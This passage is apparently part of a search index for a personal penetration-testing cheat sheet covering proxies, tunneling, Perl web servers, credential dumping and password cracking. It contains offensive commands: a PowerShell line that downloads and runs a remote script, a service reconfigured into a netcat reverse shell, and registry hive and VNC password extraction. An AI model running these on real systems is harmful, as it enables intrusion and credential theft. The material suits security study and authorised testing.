    "content": ". | Simple HTTP(S) or HTTP2:# HTTP gost -L http://:8080 # HTTPS gost -L https://:8080 # HTTP2 gost -L http2://:8080 # HTTP 1.1 to HTTP 2.0 gost -L http://:8080 -F http2://:9090 -- -L http2://:9090 # http &amp; ohttp -&gt; HTTP 1.1 transports # h2c &amp; h2 -&gt; HTTP 2.0 transports . | TLS to SNI forwarding:# Server gost -L tls://:4433/:3344 -L sni://:3344 # SNI is a TLS extension to specify # the target domain to the server # Client gost -L :8080 -F forward+tls://&lt;ip&gt;:4433 . | Relay HTTP/SOCKS:# Server gost -L relay+tls://:1080 # Client gost -L :8080 -F relay+tls://&lt;ip&gt;:1080?nodelay=false . | Proxy Usage - Curl:curl -s -x http://127.0.0.1:8080 -L https://&lt;site&gt; | w3m -T text/html . | . ",
    "url": "http://localhost:4000/#port-redirection--http-proxy--gost",
    "relUrl": "/#port-redirection--http-proxy--gost"
  },"495": {
    "doc": "ftf-hacksheet",
    "title": "Netsh",
    "content": ". | How to | . ",
    "url": "http://localhost:4000/#port-redirection--http-proxy--netsh",
    "relUrl": "/#port-redirection--http-proxy--netsh"
  },"496": {
    "doc": "ftf-hacksheet",
    "title": "SSL / TLS Proxy",
    "content": " ",
    "url": "http://localhost:4000/#port-redirection--ssl---tls-proxy",
    "relUrl": "/#port-redirection--ssl---tls-proxy"
  },"497": {
    "doc": "ftf-hacksheet",
    "title": "Gost",
    "content": ". | Strip TLS from incoming traffic:gost -L tls://127.0.0.1:4433/127.0.0.1:8080 # Test it with a netcat listener: echo -ne 'HTTP/1.0 404\\r\\nContent-Length: 0\\r\\n\\r\\n' | nc -lnvp 8080 # And curl connecting via HTTPS curl -i -k https://127.0.0.1:4433 . | Add TLS to outgoing traffic:# The response includes a CONNECT header gost -L tcp://127.0.0.1:8080/127.0.0.1:8008 -L tcp://127.0.0.1:8008 -F tls://127.0.0.1:4433 # Test it with a netcat listener: nc -lnvp 4433 # And curl connecting via HTTP curl http://127.0.0.1:8080 # Decode it back: gost -L tls://127.0.0.1:4433 -F sni://127.0.0.1:8888 . | . ",
    "url": "http://localhost:4000/#port-redirection--ssl---tls-proxy--gost",
    "relUrl": "/#port-redirection--ssl---tls-proxy--gost"
  },"498": {
    "doc": "ftf-hacksheet",
    "title": "stunnel",
    "content": ". | Site - Add SSL/TLS to local HTTP services# Note that gost should also work # Useful for making php -S HTTPS php -S 127.0.0.1:8080 &amp; # Generate a cert openssl req -new -x509 -days 365 -nodes -out crt.pem -keyout crt.pem -batch # Add HTTPS on 4433 IPv4 stunnel3 -d 0.0.0.0:4433 -r 8080 -f -p crt.pem -P /tmp/.stunnel.pid # -P &lt;path&gt; is needed for non-root . | . ",
    "url": "http://localhost:4000/#port-redirection--ssl---tls-proxy--stunnel",
    "relUrl": "/#port-redirection--ssl---tls-proxy--stunnel"
  },"499": {
    "doc": "ftf-hacksheet",
    "title": "Listeners",
    "content": " ",
    "url": "http://localhost:4000/#port-redirection--listeners",
    "relUrl": "/#port-redirection--listeners"
  },"500": {
    "doc": "ftf-hacksheet",
    "title": "Authbind",
    "content": ". | Site - Bind &lt; 1024 ports as non-root:# Netcat bind in port 80 as non-root authbind nc -lnvp 80 . | . ",
    "url": "http://localhost:4000/#port-redirection--listeners--authbind",
    "relUrl": "/#port-redirection--listeners--authbind"
  },"501": {
    "doc": "ftf-hacksheet",
    "title": "Web Servers &amp; Proxies",
    "content": " ",
    "url": "http://localhost:4000/#web-servers---proxies",
    "relUrl": "/#web-servers---proxies"
  },"502": {
    "doc": "ftf-hacksheet",
    "title": "HTTP",
    "content": " ",
    "url": "http://localhost:4000/#web-servers---proxies--http",
    "relUrl": "/#web-servers---proxies--http"
  },"503": {
    "doc": "ftf-hacksheet",
    "title": "Perl",
    "content": ". | Core Perl listeners - Return 404:# Connection timeout set to 5 seconds # Localhost only, listens to 80 and 443 perl -le '$SIG{CHLD}=IGNORE;$\"=\",pack+\";$p=fork//die?80:443;socket+S,2,1,6;eval\"setsockopt+S,@$_\"for[\"1,2\",\"l,1\"],[\"1,13\",\"ii,1,5\"],[\"1,21\",q/\"l!2\",5/],[\"6,18\",\"L,5000\"];bind+S,pack+snsnN2,2,$p,127,1;listen+S,1;close$;while(accept$;,S),fork//1;print$;(\"HTTP/1.0 404\\r\\nContent-Length: 0\\r\\n\\r\")' # The first socket call is equivalent to: # socket$s,PF_INET,SOCK_STREAM, # getprotobyname(\"tcp\") # Packed arrays structure: # [ &lt;Sock-Level&gt;, &lt;Level-Opt&gt;, &lt;Rest*&gt; ] # Sock-Level 1 -&gt; SOL_SOCKET # Level-Opt 2 -&gt; SO_REUSEADDR # Level-Opt 13 -&gt; SO_LINGER # Level-Opt 21 -&gt; SO_SNDTIMEO # See man socket7, asm-generic/socket.h # Sock-Level 6 -&gt; getprotobyname(\"tcp\") # or Socket::IPPROTO_TCP # Level-Opt 18 Socket::TCP_USER_TIMEOUT # See man tcp7 &amp; ip7, and linux/tcp.h # See if the socket options are set perl -E '$\"=\",pack+\";$,=\" \";socket$s,2,1,6;map{eval\"setsockopt\\$s,@$_;say unpack\\\"(H2)*\\\",getsockopt\\$s,$$_[0]\"}[\"1,2\",\"l,1\"],[\"1,13\",\"ii,1,5\"],[\"1,21\",q/\"l!2\",5/],[\"6,18\",\"L,5000\"]' # Minimal on 0.0.0.0, no timeout nor reuse # Causes errors on the clients perl -e '$SIG{CHLD}=IGNORE;$_=fork//die?80:443;socket+S,2,1,6;bind+S,pack+sn7,2,$_;listen+S,1;close$;while(accept$;,S),fork//1;shutdown$;,2' # shutdown results in \"Empty reply\" error # Remove shutdown for \"Connection reset\" # The pack magic comes from this perl -MSocket -E '$,=\" \";say+unpack\"(H2)*\",sockaddr_in+8888,127.0.0.1' # ^ using pack with hex-encoded addr is: perl -E 'say join\" \",unpack\"(H2)*\",pack+snN3,2,8888,0x7f000001' # Or compacted: perl -E 'say join\" \",unpack\"(H2)*\",pack\"(sn)4\",2,8888,127,1' # Or full IP - comma delimited: perl -E 'say join\" \",unpack\"(H2)*\",pack+snC12,2,8888,192,168,1,1' # Or full IP - v-string (not portable): perl -E 'say join\" \",unpack\"(H2)*\",pack+sna12,2,8888,127.0.0.1' # Or full IP - v-string (portable): perl -E 'say join\" \",unpack\"(H2)*\",pack+snN3,2,8888,unpack+N,127.0.0.1' . | Core Perl Webserver - HTTP/1.1 Keep-alive:# Serves from current dir - To serve from / # $_=\".$1\" -&gt; $_=-d$1?\"$1/index.html\":$1 perl -e '$SIG{CHLD}=IGNORE;$\"=\",\\$f=pack+\";socket+S,2,1,6;eval\"setsockopt+S,@$_\"for[\"1,2\",\"l,1\"],[\"1,13\",\"ii,1,5\"],[\"6,1\",\"l,1\"],[\"6,18\",\"L,5000\"],[\"1,21\",q/\"l!2\",5/];bind+S,pack+snN3,2,&lt;PORT&gt;,unpack+N,&lt;IP&gt;;listen+S,5;$/=\"\\r\\n\"x2;close$:while(accept$:,S),fork//1;setsockopt$:,1,20,$f;$_=\".$1\",$f=2&lt;&lt;14,map{send$:,$_,$f}\"HTTP/1.1 \",open(F,\"&lt;\",-d?$_.=\"/index.html\":$_)?200:404,\"\\r\\nContent-Type: \",'\"$(perl -MSocket -e '$\"=\",pack+\";socket+S,2,1,6;eval\"setsockopt+S,@$_\"for[\"1,13\",\"ii,1,5\"],[\"6,18\",\"L,5000\"],map[\"1,2$_\",q/\"l!2\",5/],0,1;connect+S,sockaddr_in+80,inet_aton$_=\"svn.apache.org\";$/=\"\\r\\n\"x2;send+S,\"GET /viewvc/httpd/httpd/trunk/docs/conf/mime.types?view=co HTTP/1.0\\r\\nHost: $_$/\",0;&lt;S&gt;;$_=&lt;S&gt;;y/ /|/;s!^([^#]+?)\\s+(.+)!print\"/\\\\.($2)\\$/n?\\\"$1\\\":\"!gem')\"'\"application/octet-stream\",\"\\r\\nContent-Length: \",0+-s,$/,&lt;F&gt;,$f=()while&lt;$:&gt;=~/\\s([^\\s?]+)/' # Allows dir traversal - Fix it with: # &lt;$:&gt;=~/\\s((?:(?!\\.\\.)[^\\s?])+)/ # # Opts in addition to those explained above # Sock-Level 1 -&gt; SOL_SOCKET # Level-Opt 20 -&gt; SO_RCVTIMEO # Sock-Level 6 -&gt; getprotobyname(\"tcp\") # Level-Opt 1 -&gt; TCP_NODELAY # send flag (send(2) - bits/socket.h) # MSG_MORE -&gt; 0x8000 -&gt; 2&lt;&lt;14 # Hash version - Highest performance perl -e '$SIG{CHLD}=IGNORE;%m=(\"'$(perl -MSocket -e '$\"=\",pack+\";socket+S,2,1,6;eval\"setsockopt+S,@$_\"for[\"1,13\",\"ii,1,5\"],[\"6,18\",\"L,5000\"],map[\"1,2$_\",q/\"l!2\",5/],0,1;connect+S,sockaddr_in+80,inet_aton$_=\"svn.apache.org\";{local$/=\"\\r\\n\"x2;send+S,\"GET /viewvc/httpd/httpd/trunk/docs/conf/mime.types?view=co HTTP/1.0\\r\\nHost: $_$/\",0;&lt;S&gt;}($_,@_)=split,$,=qq/\",\"$_\",\"/,/^#/||print@_,\"\"while&lt;S&gt;')'\");$\"=\",\\$d=pack+\";socket+S,2,1,6;eval\"setsockopt+S,@$_\"for[\"1,2\",\"l,1\"],[\"1,13\",\"ii,1,5\"],[\"6,1\",\"L,1\"],[\"6,18\",\"L,5000\"],[\"1,21\",q/\"l!2\",5/];bind+S,pack+snN3,2,&lt;PORT&gt;,unpack+N,'$(hostname -i)';listen+S,5;$/=\"\\r\\n\"x2;$f=2&lt;&lt;14;close$:while(accept$:,S),fork//1;setsockopt$:,1,20,$d;$_=\".$&amp;\",$d=$f,map{send$:,$_,$d}\"HTTP/1.1 \",open(F,\"&lt;\",-d?$_.=\"/index.html\":$_)?200:404,\"\\r\\nContent-Type: \",$m{s/.+\\.//r}//\"application/octet-stream\",\"\\r\\nContent-Length: \",0+-s,$/,&lt;F&gt;,$d=()while&lt;$:&gt;=~/\\s([^\\s?]+)/' # If no internet or no Socket module, use awk '/^.$/,0{if(!/^#/&amp;&amp;$2){gsub(\" \",\"|\");printf\"/\\\\.(%s)$/?\\\"%s\\\":\",$2,$1}}' mime.types # In the command substitution with: # http://svn.apache.org/viewvc/httpd/httpd/trunk/docs/conf/mime.types?view=co . | . ",
    "url": "http://localhost:4000/#web-servers---proxies--http--perl",
    "relUrl": "/#web-servers---proxies--http--perl"
  },"504": {
    "doc": "ftf-hacksheet",
    "title": "WPAD/PAC &amp; NTLM",
    "content": " ",
    "url": "http://localhost:4000/#web-servers---proxies--wpad-pac---ntlm",
    "relUrl": "/#web-servers---proxies--wpad-pac---ntlm"
  },"505": {
    "doc": "ftf-hacksheet",
    "title": "dePAC",
    "content": ". | Site (raw) - Native Perl PAC proxy# Backgrounds by default -&gt; depac --stop perl depac --wpad_file &lt;url/file&gt; --bind_port 8080 --log_file /dev/null # Add 127.0.0.1 to the dnsResolve func # as return string instead of () # Start a Perl server listening to 80/443 . | . ",
    "url": "http://localhost:4000/#web-servers---proxies--wpad-pac---ntlm--depac",
    "relUrl": "/#web-servers---proxies--wpad-pac---ntlm--depac"
  },"506": {
    "doc": "ftf-hacksheet",
    "title": "pacproxy",
    "content": ". | Site - Go PAC proxy with binaries# Able to directly parse JS pacproxy -c &lt;url/file/js&gt; [-l&lt;host:port&gt;] # -l defaults to 127.0.0.1:8080 . | . ",
    "url": "http://localhost:4000/#web-servers---proxies--wpad-pac---ntlm--pacproxy",
    "relUrl": "/#web-servers---proxies--wpad-pac---ntlm--pacproxy"
  },"507": {
    "doc": "ftf-hacksheet",
    "title": "alpaca",
    "content": ". | Site - Go PAC proxy supporting NTLM auth# Use a PAC file, default listen on 3128 alpaca -C &lt;uri&gt; -d &lt;port&gt; # Use file:///&lt;path&gt; for local file # NTLM - Asks for credentials by default alpaca -d &lt;domain&gt; -u &lt;user&gt; [-H] # -H - Generate NTLM hash for the creds # Export the creds to auto-authenticate export NTLM_CREDENTIALS=\"&lt;NTLM-hash&gt;\" alpaca -C &lt;pac&gt; -d &lt;dom&gt; -u &lt;usr&gt; . | . ",
    "url": "http://localhost:4000/#web-servers---proxies--wpad-pac---ntlm--alpaca",
    "relUrl": "/#web-servers---proxies--wpad-pac---ntlm--alpaca"
  },"508": {
    "doc": "ftf-hacksheet",
    "title": "paxy",
    "content": ". | Site - Simple Go PAC proxy# It also servers the PAC in /pac paxy -p &lt;port&gt; &lt;pac&gt; # Only listening in 127.0.0.1 # See the readme for PAC escalability . | . ",
    "url": "http://localhost:4000/#web-servers---proxies--wpad-pac---ntlm--paxy",
    "relUrl": "/#web-servers---proxies--wpad-pac---ntlm--paxy"
  },"509": {
    "doc": "ftf-hacksheet",
    "title": "Remote Command Execution",
    "content": " ",
    "url": "http://localhost:4000/#remote-command-execution",
    "relUrl": "/#remote-command-execution"
  },"510": {
    "doc": "ftf-hacksheet",
    "title": "Windows",
    "content": ". | PowerShell to run commands remotely via sessions:$sess = New-PSSession -Computer &lt;computer-name&gt; Invoke-Command -Session $sess -ScriptBlock {&lt;command&gt;} Copy-Item \"C:\\&lt;local-path&gt;\" -Destination \"C:\\&lt;remote-path&gt;\" -ToSession $sess . | Powershell executing remote scripts locally with Invoke-Expression, see more examples herepowershell.exe IEX (New-Object System.Net.WebClient).DownloadString('http://&lt;ip&gt;/helloworld.ps1') . | . ",
    "url": "http://localhost:4000/#remote-command-execution--windows",
    "relUrl": "/#remote-command-execution--windows"
  },"511": {
    "doc": "ftf-hacksheet",
    "title": "Service Tampering",
    "content": " ",
    "url": "http://localhost:4000/#service-tampering",
    "relUrl": "/#service-tampering"
  },"512": {
    "doc": "ftf-hacksheet",
    "title": "Windows",
    "content": ". | List services and their permissions:sc query sc qc &lt;service-name&gt; . | Change the command they execute::: Launch a reverse shell: sc config &lt;service-name&gt; binpath= \"C:\\&lt;path-to-nc&gt;.exe -n &lt;ip&gt; &lt;port&gt; -e C:\\WINDOWS\\System32\\cmd.exe\" sc config &lt;service-name&gt; obj= \".\\LocalSystem\" password= \"\" :: Verify the changes sc qc &lt;service-name&gt; . | Start the service:net start &lt;service-name&gt; . | . ",
    "url": "http://localhost:4000/#service-tampering--windows",
    "relUrl": "/#service-tampering--windows"
  },"513": {
    "doc": "ftf-hacksheet",
    "title": "Credentials",
    "content": " ",
    "url": "http://localhost:4000/#credentials",
    "relUrl": "/#credentials"
  },"514": {
    "doc": "ftf-hacksheet",
    "title": "Dump",
    "content": " ",
    "url": "http://localhost:4000/#credentials--dump",
    "relUrl": "/#credentials--dump"
  },"515": {
    "doc": "ftf-hacksheet",
    "title": "Windows",
    "content": " ",
    "url": "http://localhost:4000/#credentials--dump--windows",
    "relUrl": "/#credentials--dump--windows"
  },"516": {
    "doc": "ftf-hacksheet",
    "title": "Common Registry, logs, etc",
    "content": " ",
    "url": "http://localhost:4000/#credentials--dump--windows--common-registry--logs--etc",
    "relUrl": "/#credentials--dump--windows--common-registry--logs--etc"
  },"517": {
    "doc": "ftf-hacksheet",
    "title": "Batch / cmd.exe",
    "content": ". | Dump the SAM and System databases to get the hashes using samdump2 System SAM::: /y -&gt; yes ; /c -&gt; compress reg save HKLM\\System C:\\System reg save HKLM\\SAM C:\\SAM . | Software and Security:reg save HKLM\\Security C:\\Security reg save HKLM\\Software C:\\Software . | Default:reg save HKEY_USERS\\.DEFAULT C:\\DEFAULT . | NTUSER (from all users)::: Select user ntuser hive C:\\Users\\&lt;user&gt;\\NTUSER.DAT :: Try this if it doesn't work: reg load HKEY_Users\\User&lt;USER&gt; \"C:\\Users\\&lt;user&gt;\\NTUSER.DAT\" :: Backup NTUSER.dat reg save HKCU C:\\NTUSER.DAT :: Backup UsrClass.dat reg save HKCU\\Software\\Classes C:\\UsrClass.dat :: Note that selecting an offline user may allow funny things ntuser hive C:\\Users\\Default\\NTUSER.DAT :: See http://smallvoid.com/article/winnt-reset-password.html . | All the Registry Transaction Logs (.LOG) of the hives | All the .SAV files | Registry Backups: %SystemRoot%\\System32\\config\\RegBack | Transactional Registry Transaction Log (.TxR) | TODO - Find the location of: . | Amcache: C:\\Windows\\AppCompat\\Programs | Restory Points | Event log: C:\\WINDOWS\\System32\\winevt\\logs | Prefetch: C:\\Windows\\Prefetch (.pf files) | Windows Error Reporting: C:\\ProgramData\\Microsoft\\Windows\\WER\\ReportArchive | RDP cache %USERPROFILE%\\AppData\\Local\\Microsoft\\Terminal ServerClient\\Cache | Recycle BIN: C:\\$RECYCLE.BIN . | Find how to restore metadata | . | Windows Shortcuts: %USERPROFILE%\\AppData\\Roaming\\Microsoft\\Windows\\Recent . | Find how to read metadata | . | Recent Files / Most Used Files: . | %USERPROFILE%\\AppData\\ Roaming\\Microsoft\\Windows\\Recent\\AutomaticDestinations | %USERPROFILE%\\AppData\\ Roaming\\Microsoft\\Windows\\Recent\\CustomDestinations . | Find how to process them | . | . | . | Location Cheatsheet SANS | . ",
    "url": "http://localhost:4000/#credentials--dump--windows--common-registry--logs--etc--batch---cmd-exe",
    "relUrl": "/#credentials--dump--windows--common-registry--logs--etc--batch---cmd-exe"
  },"518": {
    "doc": "ftf-hacksheet",
    "title": "Impacket",
    "content": " ",
    "url": "http://localhost:4000/#credentials--dump--windows--common-registry--logs--etc--impacket",
    "relUrl": "/#credentials--dump--windows--common-registry--logs--etc--impacket"
  },"519": {
    "doc": "ftf-hacksheet",
    "title": "Secretsdump",
    "content": ". | Site - Get NTLM hashes from NTDS.ditsecretsdump.py -ntds &lt;ntds.dit&gt; -system &lt;system-hive&gt; . | . ",
    "url": "http://localhost:4000/#credentials--dump--windows--common-registry--logs--etc--impacket--secretsdump",
    "relUrl": "/#credentials--dump--windows--common-registry--logs--etc--impacket--secretsdump"
  },"520": {
    "doc": "ftf-hacksheet",
    "title": "VNC",
    "content": ". | First locate the name of the folder under Program Files as it will match the registry name, for example: . | C:\\Program Files\\RealVNC\\WinVNC4 -&gt; Matches RealVNC\\WinVNC4 in the Reg | C:\\Program Files\\RealVNC\\WinVNC -&gt; Matches RealVNC\\WinVNC in the Reg | . | Reference raymond.cc | . ",
    "url": "http://localhost:4000/#credentials--dump--windows--vnc",
    "relUrl": "/#credentials--dump--windows--vnc"
  },"521": {
    "doc": "ftf-hacksheet",
    "title": "RealVNC",
    "content": "reg query HKEY_LOCAL_MACHINE\\SOFTWARE\\RealVNC\\WinVNC4 /v password :: Try Password as well . ",
    "url": "http://localhost:4000/#credentials--dump--windows--vnc--realvnc",
    "relUrl": "/#credentials--dump--windows--vnc--realvnc"
  },"522": {
    "doc": "ftf-hacksheet",
    "title": "TightVNC",
    "content": "reg query HKEY_CURRENT_USER\\Software\\TightVNC\\Server /v password :: Try Password or PasswordViewOnly . ",
    "url": "http://localhost:4000/#credentials--dump--windows--vnc--tightvnc",
    "relUrl": "/#credentials--dump--windows--vnc--tightvnc"
  },"523": {
    "doc": "ftf-hacksheet",
    "title": "TigerVNC",
    "content": "reg query HKEY_LOCAL_USER\\Software\\TigerVNC\\WinVNC4 /v password :: Try Password . ",
    "url": "http://localhost:4000/#credentials--dump--windows--vnc--tigervnc",
    "relUrl": "/#credentials--dump--windows--vnc--tigervnc"
  },"524": {
    "doc": "ftf-hacksheet",
    "title": "UltraVNC",
    "content": "type \"C:\\Program Files\\UltraVNC\\ultravnc.ini\" :: Find it in passwd or passwd2 . ",
    "url": "http://localhost:4000/#credentials--dump--windows--vnc--ultravnc",
    "relUrl": "/#credentials--dump--windows--vnc--ultravnc"
  },"525": {
    "doc": "ftf-hacksheet",
    "title": "Import",
    "content": ". | Apparently it is possible to import with certutil the CodeSingPCA.crl files as they are CA certificates | . ",
    "url": "http://localhost:4000/#credentials--import",
    "relUrl": "/#credentials--import"
  },"526": {
    "doc": "ftf-hacksheet",
    "title": "Hashes",
    "content": " ",
    "url": "http://localhost:4000/#hashes",
    "relUrl": "/#hashes"
  },"527": {
    "doc": "ftf-hacksheet",
    "title": "Identification",
    "content": " ",
    "url": "http://localhost:4000/#hashes--identification",
    "relUrl": "/#hashes--identification"
  },"528": {
    "doc": "ftf-hacksheet",
    "title": "Name-That-Hash",
    "content": ". | Site - Identify and hashcat/john idnth --no-banner --text &lt;hash&gt; . | . ",
    "url": "http://localhost:4000/#hashes--identification--name-that-hash",
    "relUrl": "/#hashes--identification--name-that-hash"
  },"529": {
    "doc": "ftf-hacksheet",
    "title": "Haiti",
    "content": ". | Site - Identify hasheshaiti &lt;hash&gt; . | . ",
    "url": "http://localhost:4000/#hashes--identification--haiti",
    "relUrl": "/#hashes--identification--haiti"
  },"530": {
    "doc": "ftf-hacksheet",
    "title": "Bruteforce",
    "content": " ",
    "url": "http://localhost:4000/#hashes--bruteforce",
    "relUrl": "/#hashes--bruteforce"
  },"531": {
    "doc": "ftf-hacksheet",
    "title": "Wordlists",
    "content": " ",
    "url": "http://localhost:4000/#hashes--bruteforce--wordlists",
    "relUrl": "/#hashes--bruteforce--wordlists"
  },"532": {
    "doc": "ftf-hacksheet",
    "title": "Pre-made",
    "content": " ",
    "url": "http://localhost:4000/#hashes--bruteforce--wordlists--pre-made",
    "relUrl": "/#hashes--bruteforce--wordlists--pre-made"
  },"533": {
    "doc": "ftf-hacksheet",
    "title": "Passwords",
    "content": ". | SecLists . | NordVPN.txt | twitter-banned.txt | hotmail.txt | myspace.txt | top-20-common-SSH-passwords.txt | unkown-azul.txt | cirt-default-passwords.txt | 2020-200_most_used_passwords.txt | 10k-most-common.txt | 10-million-passwd-top-1000000.txt | alleged-gmail-passwords.txt | rockyou.txt.tar.gz | . | SkullSecurity | Probable-Wordlists | . ",
    "url": "http://localhost:4000/#hashes--bruteforce--wordlists--pre-made--passwords",
    "relUrl": "/#hashes--bruteforce--wordlists--pre-made--passwords"
  },"534": {
    "doc": "ftf-hacksheet",
    "title": "Users",
    "content": ". | SecLists . | cirt-default-usernames.txt | sap-default-usernames.txt | names.txt | xato-net-10-million-usernames.txt | . | . ",
    "url": "http://localhost:4000/#hashes--bruteforce--wordlists--pre-made--users",
    "relUrl": "/#hashes--bruteforce--wordlists--pre-made--users"
  },"535": {
    "doc": "ftf-hacksheet",
    "title": "Tools",
    "content": " ",
    "url": "http://localhost:4000/#hashes--bruteforce--wordlists--tools",
    "relUrl": "/#hashes--bruteforce--wordlists--tools"
  },"536": {
    "doc": "ftf-hacksheet",
    "title": "CeWL",
    "content": ". | Site - Custom generator from website:cewl -d 9 -w &lt;outlist&gt; -e --email_file &lt;oemailist&gt; -a --meta_file &lt;ometalist&gt; &lt;url&gt; # -d &lt;dep&gt; - Scrap depth high=crash # -m &lt;len&gt; - Minimum word length # -o - Spider also out-scope sites # -n - Don't show the words found # -c - Show the word count # -u &lt;UA&gt; - Set User Agent # --proxy_host | --proxy_port # --auth_type | --auth_user/pass . | . ",
    "url": "http://localhost:4000/#hashes--bruteforce--wordlists--tools--cewl",
    "relUrl": "/#hashes--bruteforce--wordlists--tools--cewl"
  },"537": {
    "doc": "ftf-hacksheet",
    "title": "Duplicut",
    "content": ". | Site - Remove duplicates without sortduplicut -l 255 &lt;ddict&gt; -o &lt;udict&gt; # -l &lt;num&gt; Filters len str &gt; &lt;num&gt; # -p Filters non-ASCII lines . | Remove words from other dictionaries:# Using bash/zsh pipes duplicut -l 255 &lt;(cat &lt;odict&gt; &lt;(echo \"-&lt;ndict&gt;-\") &lt;ndict&gt;) -o &gt;(sed -n '/-&lt;ndict&gt;-/{:a;n;p;ba;}' &gt; &lt;cndict&gt;) # or sed -n '/-&lt;ndict&gt;-/,${//!p}' . | . ",
    "url": "http://localhost:4000/#hashes--bruteforce--wordlists--tools--duplicut",
    "relUrl": "/#hashes--bruteforce--wordlists--tools--duplicut"
  },"538": {
    "doc": "ftf-hacksheet",
    "title": "Crunch",
    "content": ". | Site - Custom wordlist generator | In almost all cracking circumstances is better to use John/Hashcat rules | Find lengthy examples in this post:crunch &lt;min-len&gt; &lt;max-len&gt; -f charset.lst &lt;setname&gt; -t &lt;pattern&gt; # -o &lt;out-file&gt; - Save to file # # &lt;pattern&gt; @ substitutes -f &lt;set&gt; # # If NO -f, &lt;pattern&gt; specials are: # @ -&gt; lower-case characters # , -&gt; upper-case characters # % -&gt; numbers # ^ -&gt; symbols (space included) # Word of length 11 with symbols: crunch 11 11 -f &lt;charset.lst&gt; symbols-all -t Morris1984@ # -f symbols-all has no whitespace # Equivalent without -f crunch 11 11 -t Morris1984^ # ^ includes whitespace . | . ",
    "url": "http://localhost:4000/#hashes--bruteforce--wordlists--tools--crunch",
    "relUrl": "/#hashes--bruteforce--wordlists--tools--crunch"
  },"539": {
    "doc": "ftf-hacksheet",
    "title": "John The Ripper",
    "content": ". | Tools to format to hash.john . | Tools like: ssh2john, rar2john&#8230; | . | Best Rules - Get last KoreLogic-derived# Include them in the ruleset sudo tee -a /etc/john/john.conf &lt; &lt;new.rules&gt; &gt;/dev/null # Find the name of all the rules awk -F':|]' '/^\\[.*Rules:/{print $2}' /etc/john/john.conf | less . | Automatically detects the hash or use: hashid -j &lt;hash&gt; (-e ask for more) | Simple usage - Crack NTLM hashesjohn --format=NT --wordlist=&lt;wordlist&gt; &lt;hashfile&gt; # For NTLMv2 use: netntlmv2 . | All digits from 0 to 999999 - multi-process:john --mask='?d' --min-length=1 --max-length=6 --fork=8 &lt;hashfile&gt; . | Read wordlist from stdin + apply rules:echo \"test\" | john --pipe --format=NT --rules=KoreLogicRules &lt;hashfile&gt; # Keep john interactive alt 1 (echo \"test\" | exec john --pipe --format=NT --rules=KoreLogicRules &lt;hashfile&gt;) # Keep john interactive alt 2 john --pipe --format=NT --rules=KoreLogicRules &lt;hashfile&gt; &lt; &lt;(echo \"test\") . | List detected OpenCL devicesoptirun --no-xorg -b none -- pvkrun john --list=opencl-devices . | Run on a dedicated device:# Note that only formats ending in # -opencl work vblank_mode=0 nice -10 optirun --no-xorg -b none -- pvkrun john --pipe --rules=All --devices=1 --format=&lt;hashtype&gt;-opencl &lt;hashfile&gt; &lt; &lt;(echo \"test\") # Obtain information pkill -USR1 john # Exit john without killing optirun pkill -INT john . | Run on multiple devices at once# Not recommended as it doesn't # support reading from stdin nor # splits according to the # processing capabilities, unlike # hashcat vblank_mode=0 nice -10 optirun --no-xorg -b none -- pvkrun john --fork=2 --devices=1,2 --format=&lt;hashtype&gt;-opencl --wordlist=&lt;wordlist&gt; &lt;hashfile&gt; . | TODO - Gen dictionary with rules (see) | . ",
    "url": "http://localhost:4000/#hashes--bruteforce--john-the-ripper",
    "relUrl": "/#hashes--bruteforce--john-the-ripper"
  },"540": {
    "doc": "ftf-hacksheet",
    "title": "Hashcat",
    "content": " ",
    "url": "http://localhost:4000/#hashes--bruteforce--hashcat",
    "relUrl": "/#hashes--bruteforce--hashcat"
  },"541": {
    "doc": "ftf-hacksheet",
    "title": "Installation",
    "content": ". | Pacman - cuda - dGPU | Pacman - intel-compute-runtime - iGPU | AUR - intel-cpu-runtime - CPU | AUR - hashcat-git | AUR - hashcat-utils-git | . ",
    "url": "http://localhost:4000/#hashes--bruteforce--hashcat--installation",
    "relUrl": "/#hashes--bruteforce--hashcat--installation"
  },"542": {
    "doc": "ftf-hacksheet",
    "title": "Old packages/Legacy Systems - Unneeded",
    "content": ". | AUR - intel-opencl - CPU | AUR - intel-opencl-runtime - CPU | . ",
    "url": "http://localhost:4000/#hashes--bruteforce--hashcat--old-packages-legacy-systems---unneeded",
    "relUrl": "/#hashes--bruteforce--hashcat--old-packages-legacy-systems---unneeded"
  },"543": {
    "doc": "ftf-hacksheet",
    "title": "Rules",
    "content": ". | Pantragrule - Better and more efficient rockyou.txt | Optimized OneRuleToRuleThemAll . | Check the README for more rules | . | KoreLogic rules | Simple rules | . ",
    "url": "http://localhost:4000/#hashes--bruteforce--hashcat--rules",
    "relUrl": "/#hashes--bruteforce--hashcat--rules"
  },"544": {
    "doc": "ftf-hacksheet",
    "title": "Usage",
    "content": ". | Manually extract the hashes (from shadow, etc) and place it into a file | Identify the hash type: . | hashid -m &lt;hash&gt; (-e ask for more) | Run john to see if it automatically recognizes the hash | . | Find the hashcat numeric ID for the hash type if not auto-recognized:hashcat -h | grep -i --color=always &lt;type&gt; | less -R . | List all back-ends to use with -D / -doptirun --no-xorg -b none -- pvkrun hashcat -I . | WARNING: The -O flag used for optimized kernels may not find the password if the salt contains emojis/non-ASCII characters | CUDA + OpenCL CPU# Use -a 1 with multiple dicts # Use -r &lt;rule&gt; to apply rules # Other attacks in hashcat -h end vblank_mode=0 nice -10 optirun --no-xorg -b none -- pvkrun hashcat -D1,2 -d1,4 -a 0 -m &lt;hash-id&gt; -O -w 4 &lt;hash-file&gt; &lt;wordlist&gt; # -D 1 -&gt; CPU | -D 2 -&gt; GPU # -d 1 -&gt; CUDA | -d 4 -&gt; OpenCL CPU # See above for issues with -O flag . | CUDA + OpenCL GPU# Use -a 1 with multiple dicts # Use -r &lt;rule&gt; to apply rules # Other attacks in hashcat -h end vblank_mode=0 nice -10 optirun --no-xorg -b none -- pvkrun hashcat -D2 -d1,2 --force -a 0 -m &lt;hash-id&gt; -O -w 4 &lt;hash-file&gt; &lt;wordlist&gt; # -D 2 -&gt; GPU # -d 1 -&gt; CUDA | -d 2 -&gt; OpenCL GPU # To use the unstable OpenCL GPU # it is required to use --force # See above for issues with -O flag . | TODO - Use masks (best performance) | TODO - Create dictionary via rule/mask | . ",
    "url": "http://localhost:4000/#hashes--bruteforce--hashcat--usage",
    "relUrl": "/#hashes--bruteforce--hashcat--usage"
  },"545": {
    "doc": "ftf-hacksheet",
    "title": "Decode",
    "content": " ",
    "url": "http://localhost:4000/#hashes--bruteforce--decode",
    "relUrl": "/#hashes--bruteforce--decode"
  },"546": {
    "doc": "ftf-hacksheet",
    "title": "References",
    "content": ". | Many Windows tools from aluigi | . ",
